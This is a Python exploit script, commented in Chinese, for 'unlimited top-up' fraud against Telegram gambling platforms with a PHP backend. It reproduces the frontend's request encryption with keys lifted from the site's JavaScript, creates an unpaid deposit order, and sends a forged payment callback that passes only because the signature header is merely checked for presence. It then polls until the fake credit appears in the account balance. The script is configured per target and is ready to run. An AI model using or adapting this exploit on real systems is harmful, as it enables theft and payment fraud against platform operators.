#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通用支付回调伪造验证脚本 — TG 博彩平台(KK 型)无限充值链
========================================================
适用:前端 Vue SPA + 后端 PHP API(api.php/api.html)+ bot 自动确认充值的平台。
原理(源码审计确认):
  1. 回调端点"签名验证"只检查 header 存在(如 Kkpay-Sign/Dali-Sign/Anony-Sign)→ 伪造直接进业务
  2. 回调匹配 deposits.unique_id 后补 order_number(txid)
  3. bot 进程轮询 status=0 且 order_number 非空 → 无链上验证直接置 status=1 → balance += to_cny
复刻前端加密:ksort+md5(sign 盐)+ AES-128-CBC(随机 IV 前缀,URL-safe base64),密钥/盐在前端 JS 明文。

用法:改 CONFIG 区 → pip install pycryptodome → python forge_payment_callback.py
依赖: pip install pycryptodome
"""
import base64, hashlib, json, os, re, sys, time, urllib.parse, urllib.request, ssl

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    sys.exit("[!] 缺少依赖: pip install pycryptodome")

# ======================== CONFIG(每目标必改) ========================
API_BASE   = "https://<domain>/api.html"   # 前端 baseUrl(源码入口可能是 api.php,nginx 重写)
CB_BASE    = "https://<domain>/api.php"    # 回调入口(?direct= 路由)
AES_KEY    = b"<16byte-key-from-frontend-js>"          # 前端 JS 明文 AES key
SIGN_SALT  = "<sign-salt-from-frontend-js>"            # 前端 JS 明文签名盐
SIGN_FIELD = "sign"                                    # 签名字段名(默认 sign)
CB_DIRECT  = "kkpay"        # 回调路由名(direct=kkpay / dlpay / anony / ...)
CB_HEADER  = "Kkpay-Sign"   # 回调签名头(只查存在!kkpay=Kkpay-Sign, dlpay=Dali-Sign, anony=Anony-Sign)
LOGIN_METHOD = "login"      # 登录接口 method
INIT_DATA  = ""             # TG 小程序 window.Telegram.WebApp.initData 原文(登录用)
TOKEN      = ""             # 或直接填已有 token(留空则用 INIT_DATA 登录)
AMOUNT     = "1"            # 伪造充值金额(≥1,<1 触发小额忽略分支)
UNIQUE_ID  = ""             # 订单标识(留空自动从 paylink 提取;提取不到需手动补)
# =====================================================================

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def aes_encrypt(data: str) -> str:
    """AES-128-CBC,随机 IV 前缀,URL-safe base64(与前端 JS/后端 Aes128.php 一致)"""
    iv = os.urandom(16)
    ct = AES.new(AES_KEY, AES.MODE_CBC, iv).encrypt(pad(data.encode("utf-8"), 16))
    raw = base64.b64encode(iv + ct).decode()
    return raw.replace("+", "-").replace("/", "_").replace("=", ".")


def md5_hex(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def api_call(method: str, params: dict, timeout=30):
    """复刻前端 le():params+method → ksort → json(无空格) → sign → AES → POST data=..."""
    params = dict(params)
    params["method"] = method
    obj = {k: params[k] for k in sorted(params)}
    params[SIGN_FIELD] = md5_hex(json.dumps(obj, ensure_ascii=False, separators=(",", ":")) + SIGN_SALT)
    obj = {k: params[k] for k in sorted(params)}
    payload = json.dumps(obj, ensure_ascii=False, separators=(",", ":"))
    body = "data=" + urllib.parse.quote(aes_encrypt(payload))
    req = urllib.request.Request(
        API_BASE, data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"},
        method="POST")
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
        return json.loads(resp.read().decode())


def login():
    global TOKEN
    if not TOKEN and INIT_DATA:
        r = api_call(LOGIN_METHOD, {"initData": base64.b64encode(INIT_DATA.encode()).decode()})
        if r.get("code") == 1:
            TOKEN = r.get("token", "")
            print(f"[+] 登录成功 token: {TOKEN[:24]}...")
        else:
            sys.exit(f"[-] 登录失败: {r}")
    if not TOKEN:
        sys.exit("[!] 无 token(填 TOKEN 或 INIT_DATA)")


def create_order():
    """创建充值订单(不付钱)。method 名按目标改:deposit_kkpay / deposit_dlpay / ..."""
    r = api_call("deposit_" + CB_DIRECT, {"token": TOKEN, "amount": AMOUNT})
    print(f"[+] 创建订单: code={r.get('code')} msg={r.get('msg')}")
    return r.get("paylink", "")


def extract_unique_id(paylink: str):
    """从支付链接提取订单标识(userOrder/orderId 等)"""
    m = re.search(r"[?&](?:userOrder|orderId|order_no|orderid|trade_no)=([^&#]+)", paylink or "")
    if m:
        uid = urllib.parse.unquote(m.group(1))
        print(f"[+] 从 paylink 提取订单标识: {uid}")
        return uid
    print(f"[*] paylink 未匹配已知参数名: {paylink}")
    return None


def forge_callback(unique_id: str, txid: str, tg_id: str = ""):
    """伪造充值回调:签名头任意非空即可。body = base64(JSON)"""
    body = json.dumps({
        "businessType": "deposit", "txid": txid, "payUser": tg_id,
        "amount": AMOUNT, "currency": "usdt", "fee": "0", "userOrder": unique_id,
    }, ensure_ascii=False)
    req = urllib.request.Request(
        CB_BASE + "?direct=" + CB_DIRECT, data=base64.b64encode(body.encode()),
        headers={"Content-Type": "text/plain", CB_HEADER: "x", "User-Agent": "Mozilla/5.0"},
        method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
            out = resp.read().decode()
            print(f"[+] 回调响应({resp.status}): {out}")
            return out == "SUCCESS"
    except Exception as e:
        print(f"[-] 回调异常: {e}")
        return False


def check_balance():
    """method 名按目标改:myinf / balance / getwallet"""
    r = api_call("myinf", {"token": TOKEN})
    mi = r.get("myinf") or r
    bal = mi.get("balance") or mi.get("money")
    print(f"[+] 当前余额: {bal}")
    try:
        return float(str(bal).replace(",", ""))
    except Exception:
        return 0


def main():
    login()
    uid = UNIQUE_ID or extract_unique_id(create_order())
    if not uid:
        sys.exit("[!] 无法获取订单标识。选项:手动填 UNIQUE_ID / 从 DB 或抓包取 / 若回调支持直接 INSERT 订单(anony 型)则无需此步")
    txid = f"fake_{int(time.time()*1000)}"
    if not forge_callback(uid, txid):
        sys.exit("[!] 回调 FAIL:检查 unique_id、订单是否已处理、入口名(api.html vs api.php)")
    print("[*] 等待 bot 确认到账(轮询余额,最长 120s)...")
    for i in range(60):
        time.sleep(2)
        if check_balance() >= float(AMOUNT):
            print(f"[+] ★★★ 到账确认:伪造充值成功 ★★★")
            sys.exit(0)
        if i % 10 == 9:
            print(f"[*] 已等待 {(i+1)*2}s")
    print("[-] 120s 未见余额变化:检查 bot 进程是否运行、订单状态(status/order_number)")


if __name__ == "__main__":
    main()
